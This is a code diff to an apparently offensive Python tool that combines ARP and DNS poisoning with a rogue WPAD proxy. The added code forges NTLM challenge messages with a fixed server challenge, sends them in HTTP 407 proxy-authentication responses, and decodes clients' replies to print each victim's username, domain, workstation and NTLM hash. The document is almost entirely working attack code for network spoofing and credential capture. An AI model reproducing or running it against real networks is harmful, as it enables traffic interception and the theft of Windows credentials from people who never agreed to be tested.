@@ -4,10 +4,15 @@ import time
 from scapy.all import ARP, Ether, srp, send, sniff, conf, get_if_addr, get_if_hwaddr, DNS, DNSQR, IP, UDP, DNSRR
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import base64
+import struct
+from collections import OrderedDict
 from colorama import init, Fore, Style
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse, NTLMAuthNegotiate, AV_PAIRS, NTLMSSP_AV_FLAGS
+from impacket.nt_errors import STATUS_SUCCESS
+from impacket.spnego import SPNEGO_NegTokenResp
 
 # Initialize colorama
-init()
+init(autoreset=True)
 
 # Function to get the MAC address of the target IP
 def get_mac(ip, iface):
@@ -68,15 +73,61 @@ def dns_spoof(pkt, attacker_ip, domain):
 def start_dns_spoof(attacker_ip, domain, iface):
     sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, attacker_ip, domain), iface=iface, store=0)
 
+# Custom NTLM Challenge Packet
+class NTLMChallengePacket:
+    def __init__(self, domain, computer_name, dns_domain_name, dns_hostname):
+        self.signature = b"NTLMSSP\x00"
+        self.message_type = struct.pack("<I", 2)
+        self.target_name = domain.encode("utf-16le")
+        self.negotiate_flags = struct.pack("<I", 0x8201b207)
+        self.server_challenge = b"\x01\x02\x03\x04\x05\x06\x07\x08"
+        self.target_info = self._create_target_info(domain, computer_name, dns_domain_name, dns_hostname)
+        self.version = b"\x0a\x00\x39\x00\x00\x00\x00\x0f"
+
+    def _create_target_info(self, domain, computer_name, dns_domain_name, dns_hostname):
+        av_pairs = AV_PAIRS()
+        av_pairs[1] = domain.encode("utf-16le")  # MsvAvNbDomainName
+        av_pairs[2] = computer_name.encode("utf-16le")  # MsvAvNbComputerName
+        av_pairs[3] = dns_domain_name.encode("utf-16le")  # MsvAvDnsDomainName
+        av_pairs[4] = dns_hostname.encode("utf-16le")  # MsvAvDnsHostName
+        av_pairs[7] = struct.pack("<Q", 0)  # MsvAvTimestamp
+        av_pairs[0] = b""  # MsvAvEOL
+        return av_pairs
+
+    def get_data(self):
+        target_name_len = struct.pack("<H", len(self.target_name))
+        target_info_len = struct.pack("<H", len(self.target_info.getData()))
+        return (
+            self.signature +
+            self.message_type +
+            target_name_len + target_name_len + struct.pack("<I", 40) +
+            self.negotiate_flags +
+            self.server_challenge +
+            b"\x00" * 8 +  # Reserved
+            target_info_len + target_info_len + struct.pack("<I", 40 + len(self.target_name)) +
+            self.version +
+            self.target_name +
+            self.target_info.getData()
+        )
 
 # WPAD Exploitation
 class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
     def __init__(self, *args, attacker_ip=None, proxy_port=None, **kwargs):
         self.attacker_ip = attacker_ip
         self.proxy_port = proxy_port
+        self.ntlm_challenge = self.generate_ntlm_challenge()
         super().__init__(*args, **kwargs)
 
+    def generate_ntlm_challenge(self):
+        domain = "EXAMPLE"
+        computer_name = "SERVER"
+        dns_domain_name = "example.com"
+        dns_hostname = "server.example.com"
+        packet = NTLMChallengePacket(domain, computer_name, dns_domain_name, dns_hostname)
+        return packet.get_data()
+
     def do_GET(self):
+        self.check_for_ntlm_auth()
         if self.path == "/wpad.dat":
             self.send_response(200)
             self.send_header('Content-Type', 'application/x-ns-proxy-autoconfig')
@@ -93,7 +144,7 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_header('Server', 'Microsoft-IIS/10.0')
             self.send_header('Date', self.date_time_string())
             self.send_header('Content-Type', 'text/html')
-            self.send_header('Proxy-Authenticate', 'NTLM')
+            self.send_header('Proxy-Authenticate', 'NTLM ' + base64.b64encode(self.ntlm_challenge).decode('utf-8'))
             self.send_header('Proxy-Connection', 'close')
             self.send_header('Cache-Control', 'no-cache')
             self.send_header('Pragma', 'no-cache')
@@ -102,11 +153,12 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
             print(f"{Fore.YELLOW}[INFO] Responded with HTTP 407 Proxy Authentication Required{Style.RESET_ALL}")
 
     def do_CONNECT(self):
+        self.check_for_ntlm_auth()
         self.send_response(407)
         self.send_header('Server', 'Microsoft-IIS/10.0')
         self.send_header('Date', self.date_time_string())
         self.send_header('Content-Type', 'text/html')
-        self.send_header('Proxy-Authenticate', 'NTLM')
+        self.send_header('Proxy-Authenticate', 'NTLM ' + base64.b64encode(self.ntlm_challenge).decode('utf-8'))
         self.send_header('Proxy-Connection', 'close')
         self.send_header('Cache-Control', 'no-cache')
         self.send_header('Pragma', 'no-cache')
@@ -115,11 +167,12 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
         print(f"{Fore.YELLOW}[INFO] Responded with HTTP 407 Proxy Authentication Required{Style.RESET_ALL}")
 
     def do_POST(self):
+        self.check_for_ntlm_auth()
         self.send_response(407)
         self.send_header('Server', 'Microsoft-IIS/10.0')
         self.send_header('Date', self.date_time_string())
         self.send_header('Content-Type', 'text/html')
-        self.send_header('Proxy-Authenticate', 'NTLM')
+        self.send_header('Proxy-Authenticate', 'NTLM ' + base64.b64encode(self.ntlm_challenge).decode('utf-8'))
         self.send_header('Proxy-Connection', 'close')
         self.send_header('Cache-Control', 'no-cache')
         self.send_header('Pragma', 'no-cache')
@@ -127,15 +180,25 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
         self.end_headers()
         print(f"{Fore.YELLOW}[INFO] Responded with HTTP 407 Proxy Authentication Required{Style.RESET_ALL}")
 
-    def log_message(self, format, *args):
+    def check_for_ntlm_auth(self):
         if "Proxy-Authorization" in self.headers:
             auth_header = self.headers.get("Proxy-Authorization", "")
             if "NTLM" in auth_header:
                 print(f"{Fore.YELLOW}[INFO] NTLM Authentication Detected{Style.RESET_ALL}")
                 try:
                     ntlm_message = base64.b64decode(auth_header.split()[1])
-                    print(f"{Fore.CYAN}[INFO] NTLM Message: {ntlm_message.hex()}{Style.RESET_ALL}")
-                except (IndexError, base64.binascii.Error) as e:
+                    print(f"{Fore.YELLOW}[INFO] NTLM Message: {ntlm_message.hex()}{Style.RESET_ALL}")
+                    if len(ntlm_message) > 24:
+                        print(f"{Fore.YELLOW}[INFO] NTLM Message Length: {len(ntlm_message)}{Style.RESET_ALL}")
+                        ntlm_response = NTLMAuthChallengeResponse()
+                        ntlm_response.fromString(ntlm_message)
+                        print(f"{Fore.CYAN}[INFO] NTLM Username: {ntlm_response['user_name'].decode('utf-16le')}{Style.RESET_ALL}")
+                        print(f"{Fore.CYAN}[INFO] NTLM Domain: {ntlm_response['domain_name'].decode('utf-16le')}{Style.RESET_ALL}")
+                        print(f"{Fore.CYAN}[INFO] NTLM Workstation: {ntlm_response['host_name'].decode('utf-16le')}{Style.RESET_ALL}")
+                        print(f"{Fore.CYAN}[INFO] NTLM Hash: {ntlm_response['ntlm'].hex()}{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.RED}[ERROR] NTLM message is too short to decode properly{Style.RESET_ALL}")
+                except (IndexError, base64.binascii.Error, KeyError, struct.error) as e:
                     print(f"{Fore.RED}[ERROR] Failed to decode NTLM message: {e}{Style.RESET_ALL}")
 
 def start_proxy_server(port, attacker_ip, proxy_port):
@@ -146,7 +209,6 @@ def start_proxy_server(port, attacker_ip, proxy_port):
     httpd = HTTPServer(server_address, handler)
     print(f"{Fore.YELLOW}[INFO] Starting proxy server on port {port}{Style.RESET_ALL}")
     httpd.serve_forever()
-
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="ARP/DNS Poisoning and WPAD Exploitation Script")
